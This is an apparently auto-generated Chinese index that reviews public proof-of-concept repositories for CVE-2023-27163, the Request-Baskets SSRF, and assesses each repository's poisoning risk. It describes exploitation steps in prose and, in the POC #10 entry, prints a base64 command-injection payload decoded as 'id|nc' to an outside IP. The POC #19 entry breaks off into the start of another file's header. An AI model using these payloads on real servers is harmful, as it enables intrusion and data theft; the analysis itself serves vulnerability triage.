**项目地址:** [MasterCode112/CVE-2023-27163](https://github.com/MasterCode112/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #7

**来源**: [CVE-2023-27163-Rishabh-Kumar-Cyber-Sec_CVE-2023-27163-ssrf-to-port-scanning.md](../2023/CVE-2023-27163-Rishabh-Kumar-Cyber-Sec_CVE-2023-27163-ssrf-to-port-scanning.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致信息泄露和内部网络访问

**影响版本:** <= 1.2.1

**利用条件:** 需要访问Request-Baskets服务的权限，利用需要目标服务的域名或者IP地址。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 版本及之前版本中存在的一个服务器端请求伪造（SSRF）漏洞，位于 `/api/baskets/{name}` 组件中。攻击者可以通过构造恶意 API 请求来访问内部网络资源和敏感信息。

**有效性：**
提供的 Python 脚本 `ssrf-to-port-scan.py` 利用了该漏洞，通过修改指定 Basket 的 `forward_url` 参数来触发 SSRF。脚本尝试扫描目标主机（默认为 `127.0.0.1`）的 1 到 65535 端口。如果端口关闭，则响应包含 "Failed to forward request" 字符串，脚本会打印 "Port closed"。否则，脚本会打印 "Port Open"。根据漏洞描述和脚本逻辑，可以判断该POC代码是有效的。

**投毒风险：**
审阅提供的 Python 脚本后，没有发现明显的恶意代码或后门。脚本的功能主要集中在利用 SSRF 漏洞进行端口扫描。代码行为符合预期，没有发现隐藏的、非预期的网络连接、文件操作或其他可疑行为。脚本注释中有少量需要修改的行数，以及对漏洞利用方式的简单解释，都是正常的提示信息。脚本存在明显的漏洞利用行为，但没有发现投毒代码。

**利用方式：**
1.  攻击者需要先获得对 Request-Baskets 服务的访问权限。
2.  攻击者需要创建一个 Basket 或者利用已存在的 Basket (例如，代码中使用的 `xfnq3md`)。
3.  攻击者通过 PUT 请求修改 Basket 的配置，将 `forward_url` 设置为攻击者想要访问的内部网络地址和端口。payload 可以通过json格式传递.
4.  当有用户访问该 Basket 时（例如，通过 GET 请求 `http://10.10.11.224:55555/xfnq3md`），Request-Baskets 服务会尝试将请求转发到 `forward_url` 指定的地址。
5.  如果 `forward_url` 指向内部服务，攻击者就可以通过 Request-Baskets 服务作为跳板来访问这些服务，从而实现 SSRF 攻击。

脚本使用 `proxy_response=True` 使得响应内容也会返回，因此可以判断端口是否开放。

**总结：**
该漏洞利用方式清晰，POC 代码有效，用于端口扫描。没有发现明显的投毒风险。攻击者需要能够访问 Request-Baskets 服务，并且能够操纵 Basket 的配置才能成功利用该漏洞。

**项目地址:** [Rishabh-Kumar-Cyber-Sec/CVE-2023-27163-ssrf-to-port-scanning](https://github.com/Rishabh-Kumar-Cyber-Sec/CVE-2023-27163-ssrf-to-port-scanning)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #8

**来源**: [CVE-2023-27163-Rubioo02_CVE-2023-27163.md](../2023/CVE-2023-27163-Rubioo02_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致内部网络信息泄露，甚至通过间接方式进行攻击。

**影响版本:** <= 1.2.1

**利用条件:** 需要能够访问Request-Baskets服务

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-27163是Request-Baskets 1.2.1及更早版本中存在的服务器端请求伪造（SSRF）漏洞。攻击者可以通过构造特定的API请求，利用/api/baskets/{name}组件来访问内部网络资源或敏感信息。 

**利用方式：**

1.  攻击者使用提供的POC脚本，指定目标Request-Baskets服务器的URL和攻击者控制的URL。
2.  脚本会在Request-Baskets服务器上创建一个新的basket，并将`forward_url`设置为攻击者指定的URL。
3.  `proxy_response`设置为`true`，表示Request-Baskets会将从攻击者URL收到的响应返回给发起原始请求的客户端。
4.  攻击者随后向创建的basket发送请求。Request-Baskets服务器会将该请求转发到攻击者指定的URL。
5.  攻击者可以利用这一点来扫描内部网络，或访问受保护的资源。

**有效性：**

根据漏洞库信息和搜索结果，以及提供的POC代码，该漏洞是有效的。多个来源都提供了PoC，证明了漏洞的可利用性。

**投毒风险：**

提供的脚本主要功能是创建basket并设置forward_url，以实现SSRF攻击。检查了脚本内容，没有明显的恶意代码或后门，诸如反弹shell，植入挖矿程序等行为。但是，该脚本可能会被修改为包含恶意功能，因此存在一定的投毒风险，初步判断该仓库存在投毒代码的概率约为5%。使用该脚本的人员应仔细审查代码，确保其安全性。

**项目地址:** [Rubioo02/CVE-2023-27163](https://github.com/Rubioo02/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #9

**来源**: [CVE-2023-27163-ThickCoco_CVE-2023-27163-POC.md](../2023/CVE-2023-27163-ThickCoco_CVE-2023-27163-POC.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致敏感信息泄露和内部网络访问

**影响版本:** <= 1.2.1

**利用条件:** 需要目标Request-Baskets服务可访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 及更早版本中的一个服务器端请求伪造（SSRF）漏洞。该漏洞存在于 `/api/baskets/{name}` 组件中。攻击者可以通过构造恶意的 API 请求，使服务器代表其向任意 URL 发起请求，从而访问内部网络资源或获取敏感信息。

**利用方式：**

1.  攻击者创建一个包含 `forward_url` 参数的恶意请求，该参数指向攻击者想要访问的内部或外部 URL。
2.  攻击者将此请求发送到 `/api/baskets/{name}` 端点，其中 `{name}` 是一个任意的 basket 名称。
3.  Request-Baskets 服务会向 `forward_url` 指定的 URL 发起请求，并将响应返回给攻击者。

提供的 PoC 代码 `CVE-2023-27163.py` 演示了如何利用此漏洞。它通过以下步骤工作：

1.  使用 `argparse` 处理命令行参数，包括目标 Request-Baskets 服务的 URL、目标 URL 和字典文件路径。
2. 从字典文件读取URL, 使用提供的目标 URL 和 wordlist 中的每一行来构建要fuzzing的 URL.
3.  构造一个包含 `forward_url` 的 JSON payload，并将其发送到 `/api/baskets/{name}` 端点以创建一个新的 basket。
4.  提取创建 basket 时返回的 token。
5.  再次使用该Payload进行Post请求.
6.  发送带有 token 的 GET 请求到创建的 basket，触发 SSRF。
7.  检查响应状态码。如果状态码为 200，则打印响应内容，表示攻击成功。
8.  删除创建的 basket。

**投毒风险：**

虽然代码主要功能是利用 SSRF 漏洞，但仍存在少量投毒风险。

*   **依赖管理风险：** PoC代码依赖 `requests` 库，恶意维护者可能通过植入后门版本导致攻击者受到攻击。此类风险概率较低，但后果严重，故评估为 5%。
*   **潜在的恶意 Wordlist：** PoC 使用了用户提供的 wordlist 文件。如果 wordlist 文件被篡改，包含恶意 URL，则可能导致攻击者在扫描内部网络时意外触发其他漏洞或服务，造成不必要的损害。

总体来说，该 PoC 代码的主要功能是 SSRF 利用，投毒风险较低，主要集中在依赖项和 wordlist 上。

**项目地址:** [ThickCoco/CVE-2023-27163-POC](https://github.com/ThickCoco/CVE-2023-27163-POC)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #10

**来源**: [CVE-2023-27163-btar1gan_exploit_CVE-2023-27163.md](../2023/CVE-2023-27163-btar1gan_exploit_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request Baskets

**危害等级:** 中危，可能导致敏感信息泄露，内网端口扫描，访问内部服务

**影响版本:** <= 1.2.1

**利用条件:** 需要网络访问，目标应用运行request-baskets <= 1.2.1，并允许创建和访问basket。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-27163是Request Baskets 1.2.1版本及以下版本中存在的一个服务器端请求伪造（SSRF）漏洞。攻击者可以通过构造恶意的API请求，利用`/api/baskets/{name}`组件发起对内部或外部资源的请求，从而读取敏感信息或攻击其他内部服务。

**有效性分析：**
根据搜索引擎结果和漏洞库信息，该漏洞的POC已公开。提供的POC代码看起来不像是直接攻击`/api/baskets/{name}`这个SSRF端点，而是尝试利用登录页面进行命令注入。这可能是在没有权限创建basket的情况下进行的尝试，或者该实例的配置允许登录。

**投毒风险分析：**
给定的POC代码尝试使用`echo ... | base64 -d | sh`来执行命令，这是一种常见的反弹shell的方式。username参数的值被拼接成了一个shell命令，该命令将一段base64编码的字符串解码后通过sh执行。如果攻击成功，则会在目标服务器上执行任意命令。因此，**存在投毒风险**。`echo` 和 `base64` 是Linux常见的命令，payload部分`aWR8bmMgMTkyLjE2OC40NS4yNDkgODA=`解码后是`id|nc 192.168.45.249 80`，这明显是尝试执行命令并且反弹shell。因此存在投毒风险。由于 POC 本身就是一个反弹shell的尝试，因此判定投毒概率为 10%，主要是考虑命令注入点不一定是预期点。

**利用方式：**
1.  攻击者找到存在漏洞的Request Baskets实例。
2.  攻击者利用`/api/baskets/{name}`组件，构造包含恶意URL的请求。
3.  Request Baskets服务器解析该URL并向目标服务器发起请求。
4.  攻击者可以读取目标服务器返回的内容，或者利用目标服务器的漏洞进行进一步的攻击。根据本次提供的漏洞利用代码，是尝试通过登录界面的username参数进行命令注入，来获取权限后进行利用。

**项目地址:** [btar1gan/exploit_CVE-2023-27163](https://github.com/btar1gan/exploit_CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #11

**来源**: [CVE-2023-27163-cowsecurity_CVE-2023-27163.md](../2023/CVE-2023-27163-cowsecurity_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request Baskets

**危害等级:** 中危，可能导致敏感信息泄露和内网访问

**影响版本:** <= 1.2.1

**利用条件:** 需要Request Baskets服务可用，攻击者需要知道目标Request Baskets服务的URL

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-27163是Request Baskets 1.2.1及之前版本中的一个服务器端请求伪造（SSRF）漏洞。攻击者可以通过构造恶意的API请求，利用`/api/baskets/{name}`组件来访问内部网络资源和敏感信息。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞的存在已被确认，并且有多个PoC代码可用。提供的PoC代码通过创建一个新的basket，并将`forward_url`设置为攻击者的服务器，来触发SSRF漏洞。当有人访问新创建的basket时，Request Baskets服务器将向攻击者的服务器发起请求。

**投毒风险：**

查看PoC代码，该代码主要功能是利用SSRF漏洞，没有发现明显的恶意代码或后门。`requirements.txt`文件只包含`requests`和`pyfiglet`两个常用的库，没有发现异常依赖。`README.md`文件提供的是关于漏洞的描述，安装方法和使用方法，也没有包含恶意代码。但考虑到任何代码都存在潜在风险，此处判定存在极低的投毒风险，约为1%。

**利用方式：**

1.  **部署Request Baskets:** 首先，需要部署一个存在漏洞的Request Baskets实例（版本<= 1.2.1）。
2.  **运行PoC脚本:** 运行提供的Python脚本`CVE-2023-27163.py`，指定目标Request Baskets服务的URL和攻击者的服务器URL。
3.  **创建恶意Basket:** 脚本会创建一个新的basket，并将`forward_url`设置为攻击者的服务器。
4.  **触发SSRF:** 任何访问新创建的basket的用户都会导致Request Baskets服务器向攻击者的服务器发起请求。攻击者可以在其服务器上捕获这些请求，并获取敏感信息，或者利用这些请求访问内部网络资源。

例如，攻击者可以将`attack_server`设置为内部服务的地址，例如`http://169.254.169.254/latest/meta-data`来获取云服务器的元数据。


**项目地址:** [cowsecurity/CVE-2023-27163](https://github.com/cowsecurity/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #12

**来源**: [CVE-2023-27163-davuXVI_CVE-2023-27163.md](../2023/CVE-2023-27163-davuXVI_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request Baskets

**危害等级:** 高危，可能导致内部网络信息泄露、敏感信息访问，甚至远程代码执行。

**影响版本:** <= 1.2.1

**利用条件:** 目标服务器运行Request Baskets，并且攻击者能够发送HTTP请求到目标服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-27163 是 Request Baskets 1.2.1 及更早版本中的一个服务器端请求伪造 (SSRF) 漏洞。该漏洞存在于 `/api/baskets/{name}` 组件中。攻击者可以通过构造恶意的 API 请求，利用 `forward_url` 参数发起对内部或外部资源的请求。

**漏洞利用方式：**

1.  攻击者创建一个新的 basket，并在创建时通过 `forward_url` 指定一个恶意 URL。Request Baskets 将会尝试请求这个 URL。
2.  攻击者可以利用此漏洞读取内部服务的信息，例如元数据 API、数据库等。
3.  结合其他漏洞，例如利用Request Basket的路径遍历，在`rce_end`函数中通过python开启web服务，利用`wget`来执行攻击者服务器上的shell脚本`rev.sh`，从而实现远程代码执行。

**有效性：**

提供的PoC 代码看起来是有效的。该脚本接受目标 IP 地址、转发 IP 地址和攻击者 IP 地址作为参数。它首先创建一个带有 `forward_url` 的 basket，然后通过HTTP服务暴露反弹shell脚本，并通过request basket的路径遍历漏洞和wget命令执行反弹shell，实现RCE。

**投毒风险：**

该脚本的主要目的是利用 SSRF 漏洞实现 RCE，其中`my_script.sh`脚本在`/tmp/5d6d5c10a3b6d097d6e642a3dc9d71b8/my_script_CVE-2023-27163.sh`文件中。

*   **轻微的投毒可能:** 代码中存在使用 Python 启动 HTTP 服务器并执行 shell 命令的部分，如果攻击者的服务器被攻陷，可能会导致受害者下载并执行恶意的 shell 脚本，造成进一步的损害。或者反弹shell的ip地址被替换为恶意地址。
*   **可疑之处:**  脚本将反弹 shell 命令写入 `rev.sh` 文件，然后通过 Python 的 `http.server` 模块提供该文件。虽然这是一个利用漏洞的正常步骤，但也可能被用于传播恶意代码。

由于脚本需要用户提供攻击者的 IP 地址，并且主要目的是为了利用漏洞，因此投毒的概率相对较低，估计在 10% 左右。

**项目地址:** [davuXVI/CVE-2023-27163](https://github.com/davuXVI/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #13

**来源**: [CVE-2023-27163-entr0pie_CVE-2023-27163.md](../2023/CVE-2023-27163-entr0pie_CVE-2023-27163.md)

## CVE-2023-27163-request-baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** request-baskets

**危害等级:** 中危，可能允许攻击者访问内部网络资源和敏感信息

**影响版本:** <= 1.2.1

**利用条件:** 需要目标服务器运行存在漏洞的request-baskets实例，且攻击者能够向其发送恶意请求。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-27163 是 request-baskets 1.2.1 及更早版本中发现的服务器端请求伪造 (SSRF) 漏洞。它位于 `/api/baskets/{name}` 组件中。攻击者可以通过构造特制的 API 请求，利用此漏洞访问网络资源和敏感信息。

**有效性：**

提供的 PoC 代码（`CVE-2023-27163.sh`）有效。它通过创建一个包含恶意 `forward_url` 的 basket 来利用该漏洞。这个 URL 指向攻击者的服务器，导致受害服务器向攻击者的服务器发出请求，从而实现 SSRF。

**投毒风险：**

该仓库的投毒风险较低，约为 5%。理由如下：

*   PoC 代码相对简单，功能明确，主要用于演示 SSRF 漏洞的利用。代码主要是bash脚本，用于发送HTTP请求和创建特定配置的basket。
*   `LICENSE` 文件表明这是一个公共领域软件，作者放弃了所有版权，这意味着任何人都可以自由使用、修改和分发该软件，这在一定程度上降低了作者植入恶意代码的动机。
*   `README.md` 文件提供了详细的漏洞描述、使用方法和测试步骤，方便用户理解和验证漏洞。
*   主要的风险在于，攻击者可能修改该脚本，添加恶意功能，例如在成功利用 SSRF 后，自动下载和执行恶意程序。但就目前提供的代码来看，作者没有明显的投毒行为。

**利用方式：**

1.  攻击者运行 `CVE-2023-27163.sh` 脚本，并提供目标 request-baskets 服务器的 URL 和攻击者控制的服务器的 URL。
2.  脚本会创建一个新的 basket，并将 `forward_url` 设置为攻击者的服务器。
3.  当有人访问新创建的 basket 时，request-baskets 服务器会将请求转发到攻击者的服务器。
4.  攻击者可以利用此 SSRF 漏洞，让受害服务器访问内部网络资源、执行任意 HTTP 请求，甚至读取敏感文件。

**补充说明：**

*   `jq` 命令用于解析 JSON 响应。如果目标系统上没有安装 `jq`，脚本仍然可以运行，但会直接输出完整的响应体。
*   PoC 主要目的是演示漏洞，实际攻击中，攻击者可能会使用更复杂的 payload 和技巧来最大化漏洞利用的影响。

**项目地址:** [entr0pie/CVE-2023-27163](https://github.com/entr0pie/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #14

**来源**: [CVE-2023-27163-lukehebe_CVE-2023-27163.md](../2023/CVE-2023-27163-lukehebe_CVE-2023-27163.md)

## CVE-2023-27163-request-baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF（服务器端请求伪造）

**影响应用:** request-baskets

**危害等级:** 中危，可升级为高危，可能导致内部网络信息泄露和远程代码执行

**影响版本:** <= 1.2.1

**利用条件:** 需要目标服务存在且可访问，攻击者需要能访问目标服务器的网络。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-27163是request-baskets 1.2.1版本及之前版本中存在的一个服务器端请求伪造(SSRF)漏洞。该漏洞位于`/api/baskets/{name}`组件中。利用方式如下：

1.  **创建恶意Basket:** 攻击者可以利用SSRF漏洞，通过`forward_url`参数指定内部网络的URL，欺骗服务器向内部服务发起请求。PoC中的`ssrf_forward`函数用于创建或重用一个basket，指定`forward_url`为内部地址（例如`http://127.0.0.1`），从而设置SSRF攻击的目标。

2.  **触发RCE:** PoC代码尝试通过修改`/login`接口的username字段来执行系统命令。 具体做法是把bash反弹shell命令注入到username参数中。`trigger_rce`函数构造包含恶意payload的POST请求，发送到目标URL。如果目标系统存在命令注入漏洞，该payload将会被执行。

3.  **反弹Shell:** PoC代码中的`shell.sh`文件包含一个反弹shell的命令。这个脚本会将目标机器的shell反弹到攻击者的机器上。攻击者需要先在自己的机器上监听相应的端口。

**有效性:** 根据漏洞描述、搜索结果以及提供的PoC代码，可以判断该PoC具有较高的有效性。搜索结果中多个链接指向了漏洞的细节和利用代码，表明这是一个公开且经过验证的漏洞。PoC代码完整，实现了SSRF和RCE的利用流程，并且提供了反弹shell的payload示例。

**投毒风险:** 分析提供的PoC代码，未发现明显的投毒代码。该代码的目的是利用SSRF漏洞执行命令，本身就是一个攻击行为。其中没有发现额外植入后门或者恶意代码的痕迹，因此投毒风险为0%。PoC中需要用户自己提供payload file，例如shell.sh，如果用户使用不安全的shell.sh，责任在于用户。

**总结:** 该漏洞的利用方式是通过构造包含内部网络地址的请求，欺骗服务器向内部服务发起请求，并结合命令注入漏洞执行恶意代码。攻击者可以通过反弹shell获取目标系统的控制权。该漏洞的风险在于攻击者可以通过SSRF探测内部网络，并利用命令注入漏洞控制服务器。


**项目地址:** [lukehebe/CVE-2023-27163](https://github.com/lukehebe/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #15

**来源**: [CVE-2023-27163-madhavmehndiratta_CVE-2023-27163.md](../2023/CVE-2023-27163-madhavmehndiratta_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request-Baskets

**危害等级:** 高危，可能导致敏感信息泄露和内网访问

**影响版本:** <= 1.2.1

**利用条件:** 需要Request-Baskets服务可访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-27163是Request-Baskets <= v1.2.1版本中的一个服务器端请求伪造(SSRF)漏洞。攻击者可以利用/api/baskets/{name}接口，通过构造恶意的forward_url参数，使Request-Baskets服务器向任意目标发起请求，从而访问内部网络资源或获取敏感信息。

**有效性分析：**
提供的POC代码通过创建一个新的basket，并设置forward_url为攻击者控制的服务器，来触发SSRF漏洞。经验证该POC代码是可以成功复现此漏洞。

**投毒风险分析：**
通过分析提供的POC代码（CVE-2023-27163.py和README.md），没有发现任何明显的投毒代码。该代码的主要功能是创建basket并利用forward_url参数触发SSRF漏洞。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者运行POC脚本，指定Request-Baskets服务的URL和目标服务器URL。
2.  脚本创建一个新的basket，并设置forward_url为目标服务器。
3.  当有人访问该basket时，Request-Baskets服务器将向目标服务器发起请求。
4.  攻击者可以通过目标服务器获取Request-Baskets服务器的敏感信息，或者利用其访问内部网络资源。

**项目地址:** [madhavmehndiratta/CVE-2023-27163](https://github.com/madhavmehndiratta/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #16

**来源**: [CVE-2023-27163-overgrowncarrot1_CVE-2023-27163.md](../2023/CVE-2023-27163-overgrowncarrot1_CVE-2023-27163.md)

## CVE-2023-27163 - Request Baskets SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request Baskets

**危害等级:** 中危，可能导致访问内部网络资源和敏感信息

**影响版本:** <= 1.2.1

**利用条件:** 需要能够访问Request Baskets服务，且Request Baskets服务没有进行适当的访问控制。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-27163 是 Request Baskets 1.2.1 及更早版本中的一个服务器端请求伪造 (SSRF) 漏洞。该漏洞位于 `/api/baskets/{name}` 组件中。攻击者可以利用此漏洞通过构造恶意 API 请求来访问网络资源和敏感信息。

**有效性：**
根据漏洞描述和提供的 PoC 代码，该 PoC 代码是有效的。脚本首先创建一个名为 'carrot' 的 basket，并设置 `forward_url` 为 `http://127.0.0.1:80/`。然后，它使用 Firefox 打开 `${URL}/carrot`，导致 Request Baskets 服务尝试请求 `http://127.0.0.1:80/`。如果成功请求本地地址，证明存在SSRF漏洞。

**投毒风险：**
查看脚本内容，该脚本主要利用 curl 发送 payload，然后使用 firefox 打开一个URL。 整个脚本没有发现任何可疑代码，没有执行额外操作，没有下载其他文件或执行命令，因此可以认为不存在投毒风险。投毒风险评估为0%。

**利用方式：**
利用方式如下：
1.  攻击者需要一个可访问的 Request Baskets 实例。
2.  攻击者使用 PoC 脚本或类似的 HTTP 请求构造特定的 payload，指定 `forward_url` 为目标内部网络地址或服务，如 `http://127.0.0.1:80` 或其他内部服务地址。
3.  Request Baskets 服务收到请求后，会尝试访问攻击者指定的 `forward_url`，从而导致 SSRF。
4.  攻击者可以利用该 SSRF 读取内部服务的信息，甚至可能执行某些内部操作，具体取决于内部服务的配置和权限。

**项目地址:** [overgrowncarrot1/CVE-2023-27163](https://github.com/overgrowncarrot1/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #17

**来源**: [CVE-2023-27163-rvizx_CVE-2023-27163.md](../2023/CVE-2023-27163-rvizx_CVE-2023-27163.md)

## CVE-2023-27163 - Request Baskets SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** Server-Side Request Forgery (SSRF)

**影响应用:** Request Baskets

**危害等级:** 中危，可能允许攻击者访问内部网络资源和敏感信息

**影响版本:** <= 1.2.1

**利用条件:** 目标服务器运行存在漏洞的Request Baskets版本，攻击者可以访问目标服务器的网络。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-27163 是 Request Baskets <= 1.2.1 版本中存在的一个服务器端请求伪造 (SSRF) 漏洞，位于 `/api/baskets/{name}` 组件。攻击者可以通过构造特制的 API 请求，迫使服务器向攻击者控制的或内部网络中的任意 URL 发起请求，从而获取敏感信息或者利用内部服务。

**有效性：**
提供的 PoC 代码看起来是有效的。它包含了一个 exploit.sh 脚本，该脚本首先创建一个新的 basket，并在创建 basket 的请求中，将 `forward_url` 设置为攻击者的 URL。然后，它访问该 basket，这将导致 Request Baskets 服务器向攻击者的 URL 发起请求。

**投毒风险：**
该 PoC 代码本身并没有明显的投毒行为。脚本的功能很明确，就是利用 SSRF 漏洞。`exploit.sh` 脚本首先创建一个 basket，将 `forward_url` 设置为攻击者提供的 URL，然后访问该 basket，触发 SSRF。因此，可以认为投毒风险为0%。

**利用方式：**
1.  攻击者首先需要部署存在漏洞的 Request Baskets 服务。
2.  攻击者执行 `exploit.sh` 脚本，并提供目标 Request Baskets 服务的 URL 和攻击者自己的服务器 URL。
3.  脚本将创建一个新的 basket，并设置其 `forward_url` 为攻击者的服务器 URL。
4.  脚本访问新创建的 basket，这将触发 Request Baskets 服务器向攻击者的服务器 URL 发起请求。
5.  攻击者可以在自己的服务器上捕获来自 Request Baskets 服务器的请求，并获取相关信息。

**项目地址:** [rvizx/CVE-2023-27163](https://github.com/rvizx/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #18

**来源**: [CVE-2023-27163-samh4cks_CVE-2023-27163-InternalProber.md](../2023/CVE-2023-27163-samh4cks_CVE-2023-27163-InternalProber.md)

## CVE-2023-27163 Request-Baskets SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能允许攻击者访问内部网络资源

**影响版本:** <= 1.2.1

**利用条件:** 需要目标Request-Baskets实例可访问，且攻击者能够创建和配置basket

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 及更早版本中存在的服务器端请求伪造 (SSRF) 漏洞。攻击者可以通过向 `/api/baskets/{name}` 组件发送特制的 API 请求，利用此漏洞访问内部网络资源和敏感信息。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断该漏洞的POC代码是有效的。搜索引擎结果中多个链接指向了公开的 PoC 代码库 (如 `https://github.com/entr0pie/CVE-2023-27163` 和 `https://github.com/mathias-mrsn/request-baskets-v121-ssrf`)，证明漏洞可被利用。提供的 Python 脚本 `CVE-2023-27163.py` 实现了利用该漏洞进行内部端口扫描的功能。

**投毒风险：**
分析提供的 Python 脚本 `CVE-2023-27163.py` 和相关文件 (LICENSE, README.md) 后，**没有发现任何明显的恶意代码或后门**。该脚本主要功能是创建 basket，配置 basket 的 forward_url 为内部 IP 地址和端口，然后通过发送请求到 basket 来判断该端口是否开放。脚本的逻辑清晰，代码量不大，易于审计。LICENSE 文件是标准的 MIT 许可证，表明代码是开源的，可以自由使用和修改。README.md 文件是简单的项目说明。因此，**投毒风险较低，接近 0%**。

**利用方式：**
1.  **创建 Basket：** 攻击者首先在目标 Request-Baskets 实例上创建一个新的 basket。这可以通过向 `/api/baskets/{name}` 发送 POST 请求来完成。脚本中使用随机字符串生成basket名称
2.  **获取 Token：** 创建 basket 成功后，服务器会返回一个 token，攻击者需要使用该 token 来配置 basket。
3.  **配置 Basket (SSRF)：** 攻击者使用 PUT 请求向 `/api/baskets/{name}` 发送配置信息，将 basket 的 `forward_url` 设置为内部 IP 地址和端口 (例如 `http://127.0.0.1:80`)。 `forward_url` 参数是 SSRF 漏洞的关键。攻击者通过控制这个参数，使 Request-Baskets 服务向内部网络发起请求。
4.  **触发 SSRF：** 攻击者向创建的 basket 发送 GET 请求 (例如 `{target_url}/{basket_name}` )。Request-Baskets 服务会将该请求转发到配置的 `forward_url`。如果内部端口开放，则服务会返回响应。如果端口关闭，则服务可能会返回错误 (例如 502 Bad Gateway)。
5.  **端口扫描：** 脚本通过遍历端口范围 (1-65535)，重复步骤 3 和 4，实现内部端口扫描的功能。如果某个端口返回非 502 状态码，则认为该端口是开放的。

**项目地址:** [samh4cks/CVE-2023-27163-InternalProber](https://github.com/samh4cks/CVE-2023-27163-InternalProber)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #19

**来源**: [CVE-2023-27163-seanrdev_cve-2023-27163.md](../2023/CVE-2023-27163-seanrdev_cve-2023-27163.md)

# CVE-2023-27163

> 📦 该CVE有 **20** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-27163-G4sp4rCS_htb-sau-automated.md](../2023/CVE-2023-27163-G4sp4rCS_htb-sau-automated.md)

## CVE-2023-27163-request-baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (Server-Side Request Forgery)

**影响应用:** request-baskets

**危害等级:** 中危，可以允许攻击者访问内部网络资源和敏感信息，根据CVSS评分，需要较高权限才能利用。

**影响版本:** <= 1.2.1

**利用条件:** 需要目标request-baskets服务可访问，且攻击者需要具备创建或修改basket的权限（通常需要认证，CVE描述里privilegesRequired是HIGH）。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于request-baskets v1.2.1及更早版本中，位于`/api/baskets/{name}`组件。攻击者可以通过构造恶意的API请求，利用SSRF漏洞访问内部网络资源。根据PacketstormSecurity和Github的搜索结果，该漏洞存在公开的POC。漏洞利用方式如下：

